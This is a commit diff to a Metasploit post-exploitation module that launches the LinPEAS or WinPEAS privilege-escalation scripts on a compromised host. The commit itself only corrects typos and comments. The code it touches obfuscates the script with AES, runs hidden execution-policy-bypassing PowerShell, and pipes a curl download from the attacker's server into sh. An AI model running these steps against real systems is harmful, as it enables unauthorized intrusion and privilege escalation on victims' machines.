      'Name'           => 'Multi PEASS launcher',
      'Description'    => %q{	      'Description'    => %q{
          This module will launch the indicated PEASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.	          This module will launch the indicated PEASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.
          You need to indicate the URL or local path to LinPEAS if you are in some Unix or to WinPEAS if you are in Windows.	          You need to indicate the URL or local path to LinPEAS if you are on any Unix-based system or to WinPEAS if you are on Windows.
          By default this script will upload the PEASS script to the host (encrypted and/or encoded) and will load, deobfuscate, and execute it.	          By default this script will upload the PEASS script to the host (encrypted and/or encoded) and will load, deobfuscate, and execute it.
          You can configure this module to download the encrypted/encoded PEASS script from this metasploit instance via HTTP instead of uploading it.	          You can configure this module to download the encrypted/encoded PEASS script from this metasploit instance via HTTP instead of uploading it.
      },	      },
@@ -52,18 +52,18 @@ def initialize(info={})
  end	  end


  def run	  def run
    ps_var1 = rand(36**5).to_s(36) #Winpeas PS needed variable	    ps_var1 = rand(36**5).to_s(36) # Winpeas PS needed variable


    # Load PEASS script in memory	    # Load PEASS script in memory
    peass_script = load_peass()	    peass_script = load_peass()
    print_good("PEASS script successfully retreived.")	    print_good("PEASS script successfully retrieved.")


    # Obfuscate loaded PEASS script	    # Obfuscate loaded PEASS script
    if datastore["PASSWORD"].length > 1	    if datastore["PASSWORD"].length > 1
      # If no Windows, check if openssl exists	      # If no Windows, check if openssl exists
      if !session.platform.include?("win")	      if !session.platform.include?("win")
        openssl_path = cmd_exec("command -v openssl")	        openssl_path = cmd_exec("command -v openssl")
        raise 'openssl not found in victim, unset the password of the module!' unless openssl_path.include?("openssl")	        raise 'openssl not found on victim, unset the password of the module!' unless openssl_path.include?("openssl")
      end	      end


      # Get encrypted PEASS script in B64	      # Get encrypted PEASS script in B64
@@ -82,7 +82,7 @@ def run
        # As the PS function is only capable of decrypting readable strings	        # As the PS function is only capable of decrypting readable strings
        # in Windows we encrypt the B64 of the binary and then load it in memory 	        # in Windows we encrypt the B64 of the binary and then load it in memory 
        # from the initial B64. Then: original -> B64 -> encrypt -> B64	        # from the initial B64. Then: original -> B64 -> encrypt -> B64
        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) #Base64 before encrypting it	        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) # Base64 before encrypting it
        peass_script_64 = aes_enc_peass_ret["encrypted"]	        peass_script_64 = aes_enc_peass_ret["encrypted"]
        key_b64 = aes_enc_peass_ret["key_b64"]	        key_b64 = aes_enc_peass_ret["key_b64"]
        iv_b64 = aes_enc_peass_ret["iv_b64"]	        iv_b64 = aes_enc_peass_ret["iv_b64"]
@@ -97,7 +97,7 @@ def run
      # If no Windows, check if base64 exists	      # If no Windows, check if base64 exists
      if !session.platform.include?("win")	      if !session.platform.include?("win")
        base64_path = cmd_exec("command -v base64")	        base64_path = cmd_exec("command -v base64")
        raise 'base64 not found in victim, set a 32B length password!' unless base64_path.include?("base64")	        raise 'base64 not found on victim, set a 32B length password!' unless base64_path.include?("base64")
      end	      end


      # Encode PEASS script	      # Encode PEASS script
@@ -137,7 +137,7 @@ def run
      upload_file(temp_path, file.path)	      upload_file(temp_path, file.path)
      print_good("Uploaded")	      print_good("Uploaded")


      #Start the cmd, prepare to read from the uploaded file	      # Start the cmd, prepare to read from the uploaded file
      if session.platform.include?("win")	      if session.platform.include?("win")
        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Get-Content -Path #{temp_path};"	        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Get-Content -Path #{temp_path};"
        last_cmd = "del #{temp_path};"	        last_cmd = "del #{temp_path};"
@@ -146,7 +146,7 @@ def run
        last_cmd = " ; rm #{temp_path}"	        last_cmd = " ; rm #{temp_path}"
      end	      end


    # Instead of writting the file to disk, download it from HTTP	    # Instead of writing the file to disk, download it from HTTP
    else	    else
      last_cmd = ""	      last_cmd = ""
      # Start HTTP server	      # Start HTTP server
@@ -159,13 +159,13 @@ def run
      url_download_peass = http_protocol + http_ip + http_port + http_path      	      url_download_peass = http_protocol + http_ip + http_port + http_path      
      print_good("Listening in #{url_download_peass}")	      print_good("Listening in #{url_download_peass}")


      # Configure the download of the scrip in Windows	      # Configure the download of the script in Windows
      if session.platform.include?("win")	      if session.platform.include?("win")
        cmd = "$ProgressPreference = 'SilentlyContinue';"	        cmd = "$ProgressPreference = 'SilentlyContinue';"
        cmd += get_bypass_tls_cert()	        cmd += get_bypass_tls_cert()
        cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"	        cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"


      # Configure the download of the scrip in unix	      # Configure the download of the script in Unix
      else	      else
        cmd = "curl -k -s \"#{url_download_peass}\""	        cmd = "curl -k -s \"#{url_download_peass}\""
        curl_path = cmd_exec("command -v curl")	        curl_path = cmd_exec("command -v curl")
@@ -193,7 +193,7 @@ def run


        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"].to_i)	        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"].to_i)


        # If unix, then, suppose linpeas was loaded	        # If Unix, then, suppose linpeas was loaded
      else	      else
        cmd += "| #{decode_linpeass_cmd}"	        cmd += "| #{decode_linpeass_cmd}"
        cmd += "| sh -s -- #{datastore['PARAMETERS']}"	        cmd += "| sh -s -- #{datastore['PARAMETERS']}"
@@ -259,7 +259,7 @@ def load_peass
  end	  end


  def aes_enc_peass(peass_script)	  def aes_enc_peass(peass_script)
    # Encrypt the PEASS script with aes	    # Encrypt the PEASS script with AES (CBC Mode)
    key = datastore["PASSWORD"]	    key = datastore["PASSWORD"]
    iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv	    iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv


@@ -333,7 +333,7 @@ def get_ps_aes_decr
        $csDecrypt = new-object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)	        $csDecrypt = new-object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $srDecrypt = new-object System.IO.StreamReader($csDecrypt)	        $srDecrypt = new-object System.IO.StreamReader($csDecrypt)
        #Write all data to the stream.	        # Write all data to the stream.
        $plainText = $srDecrypt.ReadToEnd()	        $plainText = $srDecrypt.ReadToEnd()
        $srDecrypt.Close()	        $srDecrypt.Close()
        $csDecrypt.Close()	        $csDecrypt.Close()
0 comments on commit 6525727